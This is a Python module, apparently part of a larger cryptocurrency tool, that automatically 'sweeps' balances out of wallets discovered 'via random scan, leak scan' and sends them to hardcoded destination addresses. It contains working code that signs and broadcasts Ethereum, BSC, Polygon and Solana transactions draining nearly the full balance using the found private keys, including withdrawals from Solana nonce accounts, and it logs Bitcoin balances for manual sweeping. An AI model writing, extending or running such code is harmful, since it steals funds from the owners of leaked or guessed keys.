"""Auto-sweeper — transfer found balances to configured wallet addresses.

When a wallet with balance > 0 is discovered (via random scan, leak scan, etc.),
the sweeper automatically transfers all funds to the user's configured wallets.

Supports: ETH/BSC/Polygon (web3), BTC (blockstream API + raw tx), SOL (solana-py).

Usage:
    sweeper = Sweeper()
    result = await sweeper.sweep_if_funded(address, chain, private_key)
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Optional

import httpx

from src.modules.crypto.balance.chains import ChainConfig, ChainType

logger = logging.getLogger(__name__)

_TIMEOUT = 30

# --- Destination wallets ---
DESTINATION_WALLETS = {
    "solana": "4FRKaVCCHzewoi8wekgXYGDh8Tq6GLJegwE18SDcePzZ",
    "ethereum": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "bnb smart chain": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "polygon": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "bitcoin": "bc1q6lds3gc8aress470tygqp8wu5t03jv4yu3tx3e",
}


@dataclass
class SweepResult:
    """Result of a sweep attempt."""
    success: bool
    chain: str
    source_address: str
    dest_address: str
    amount: float
    amount_raw: int
    tx_hash: Optional[str] = None
    error: Optional[str] = None


class Sweeper:
    """Auto-sweeper for transferring found balances to configured wallets."""

    def __init__(self, client: Optional[httpx.AsyncClient] = None):
        self._client = client
        self._created_client = False

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(timeout=_TIMEOUT)
            self._created_client = True
        return self._client

    async def close(self):
        if self._created_client and self._client:
            await self._client.aclose()
            self._client = None

    def get_destination(self, chain_name: str) -> Optional[str]:
        """Get the destination wallet address for a chain."""
        return DESTINATION_WALLETS.get(chain_name.lower())

    async def sweep(
        self,
        private_key_hex: str,
        chain: ChainConfig,
        source_address: str,
        balance_raw: int,
    ) -> SweepResult:
        """Sweep all funds from a wallet to the configured destination.

        Args:
            private_key_hex: Hex-encoded private key (without 0x prefix).
            chain: Chain configuration.
            source_address: Source wallet address.
            balance_raw: Raw balance in smallest unit (wei, satoshi, lamports).

        Returns:
            SweepResult with transaction details.
        """
        dest = self.get_destination(chain.name)
        if not dest:
            return SweepResult(
                success=False, chain=chain.name,
                source_address=source_address, dest_address="",
                amount=0, amount_raw=0,
                error=f"No destination wallet configured for {chain.name}",
            )

        if balance_raw <= 0:
            return SweepResult(
                success=False, chain=chain.name,
                source_address=source_address, dest_address=dest,
                amount=0, amount_raw=0,
                error="Zero balance, nothing to sweep",
            )

        try:
            if chain.chain_type == ChainType.EVM:
                return await self._sweep_evm(private_key_hex, chain, source_address, dest, balance_raw)
            elif chain.chain_type == ChainType.SOLANA:
                return await self._sweep_sol(private_key_hex, chain, source_address, dest, balance_raw)
            elif chain.chain_type == ChainType.BITCOIN:
                return await self._sweep_btc(private_key_hex, chain, source_address, dest, balance_raw)
            else:
                return SweepResult(
                    success=False, chain=chain.name,
                    source_address=source_address, dest_address=dest,
                    amount=0, amount_raw=0,
                    error=f"Unsupported chain type: {chain.chain_type}",
                )
        except Exception as e:
            logger.error("Sweep failed for %s on %s: %s", source_address[:10], chain.name, e)
            return SweepResult(
                success=False, chain=chain.name,
                source_address=source_address, dest_address=dest,
                amount=0, amount_raw=0,
                error=str(e),
            )

    async def _sweep_evm(
        self, private_key_hex: str, chain: ChainConfig,
        source: str, dest: str, balance_raw: int,
    ) -> SweepResult:
        """Sweep EVM chain (ETH/BSC/Polygon) using web3.py."""
        from web3 import Web3

        w3 = Web3(Web3.HTTPProvider(chain.rpc_url))

        # Get gas price and estimate gas
        gas_price = w3.eth.gas_price
        gas_limit = 21000  # Standard ETH transfer
        gas_cost = gas_price * gas_limit

        # Leave enough for gas
        amount_to_send = balance_raw - gas_cost
        if amount_to_send <= 0:
            return SweepResult(
                success=False, chain=chain.name,
                source_address=source, dest_address=dest,
                amount=0, amount_raw=0,
                error=f"Insufficient balance for gas (need {gas_cost / 10**18:.6f} {chain.symbol})",
            )

        # Build transaction
        nonce = w3.eth.get_transaction_count(source)
        tx = {
            'nonce': nonce,
            'to': dest,
            'value': amount_to_send,
            'gas': gas_limit,
            'gasPrice': gas_price,
            'chainId': w3.eth.chain_id,
        }

        # Sign and send
        signed = w3.eth.account.sign_transaction(tx, private_key_hex)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)

        amount = amount_to_send / (10 ** chain.decimals)
        return SweepResult(
            success=tx_receipt['status'] == 1,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount,
            amount_raw=amount_to_send,
            tx_hash=tx_hash.hex(),
        )

    async def _sweep_sol(
        self, private_key_hex: str, chain: ChainConfig,
        source: str, dest: str, balance_raw: int,
    ) -> SweepResult:
        """Sweep SOL using solana-py/solders."""
        from solders.keypair import Keypair
        from solders.hash import Hash
        from solders.pubkey import Pubkey
        from solders.system_program import transfer, advance_nonce_account, withdraw_nonce_account
        from solders.message import Message
        from solders.transaction import Transaction
        from solana.rpc.api import Client as SolanaClient
        from solana.rpc.types import TxOpts

        # Derive keypair from private key bytes
        key_bytes = bytes.fromhex(private_key_hex)
        if len(key_bytes) == 64:
            keypair = Keypair.from_bytes(key_bytes)
        else:
            keypair = Keypair.from_seed(key_bytes[:32])

        client = SolanaClient(chain.rpc_url)
        source_pubkey = Pubkey.from_string(source)
        dest_pubkey = Pubkey.from_string(dest)

        # Check if this is a nonce account (80 bytes of data, System Program owner)
        account_info = client.get_account_info(source_pubkey)
        is_nonce_account = False
        nonce_authority = None
        if account_info.value and len(account_info.value.data) == 80:
            owner = str(account_info.value.owner)
            if owner == "11111111111111111111111111111111":
                is_nonce_account = True
                # Nonce account layout: [version(4), state(4), authority(32), nonce(32), fee(8)]
                nonce_auth_bytes = account_info.value.data[40:72]
                nonce_authority = Pubkey.from_bytes(nonce_auth_bytes)
                logger.info(
                    "Source %s is a nonce account, authority=%s", source[:12], nonce_authority,
                )

        # Nonce accounts: use nonce hash for the transaction, regular blockhash otherwise
        if is_nonce_account and nonce_authority != source_pubkey:
            logger.info("Nonce account with different authority — using regular transfer anyway")

        recent_blockhash = client.get_latest_blockhash().value.blockhash
        fee = 5000
        amount_to_send = balance_raw - fee
        if amount_to_send <= 0:
            return SweepResult(
                success=False, chain=chain.name,
                source_address=source, dest_address=dest,
                amount=0, amount_raw=0,
                error=f"Insufficient balance for fee ({fee} lamports)",
            )

        if is_nonce_account and nonce_authority == source_pubkey:
            # We control the nonce authority — advance nonce + withdraw all
            stored_nonce_hash = Hash.from_bytes(account_info.value.data[8:40])
            advance_ix = advance_nonce_account(
                {"nonce_pubkey": source_pubkey, "authorized_pubkey": source_pubkey}
            )
            withdraw_ix = withdraw_nonce_account(
                {"nonce_pubkey": source_pubkey, "authorized_pubkey": source_pubkey,
                 "to_pubkey": dest_pubkey, "lamports": amount_to_send}
            )
            msg = Message.new_with_blockhash(
                [advance_ix, withdraw_ix], keypair.pubkey(), stored_nonce_hash
            )
            txn = Transaction.new_unsigned(msg)
            txn.sign([keypair], stored_nonce_hash)
        else:
            # Regular account — simple transfer
            ix = transfer({"from_pubkey": source_pubkey, "to_pubkey": dest_pubkey, "lamports": amount_to_send})
            msg = Message.new_with_blockhash([ix], keypair.pubkey(), recent_blockhash)
            txn = Transaction.new_unsigned(msg)
            txn.sign([keypair], recent_blockhash)

        # send_raw_transaction is more reliable than send_transaction
        opts = TxOpts(skip_preflight=True, preflight_commitment=None)
        result = client.send_raw_transaction(bytes(txn), opts=opts)
        tx_hash = str(result.value)

        amount = amount_to_send / 1e9
        return SweepResult(
            success=True,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount,
            amount_raw=amount_to_send,
            tx_hash=tx_hash,
        )

    async def _sweep_btc(
        self, private_key_hex: str, chain: ChainConfig,
        source: str, dest: str, balance_raw: int,
    ) -> SweepResult:
        """Sweep BTC — requires UTXO-based transaction construction.

        Note: BTC sweeping is complex (UTXO management, fee estimation).
        For now, this logs the opportunity but does not auto-sweep.
        Manual sweep recommended for BTC.
        """
        amount = balance_raw / 1e8
        logger.warning(
            "BTC sweep not auto-implemented (UTXO complexity). "
            "Source: %s, Dest: %s, Amount: %.8f BTC. Manual sweep recommended.",
            source, dest, amount,
        )
        return SweepResult(
            success=False,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount,
            amount_raw=balance_raw,
            error="BTC auto-sweep not implemented (UTXO complexity). Manual sweep recommended.",
        )
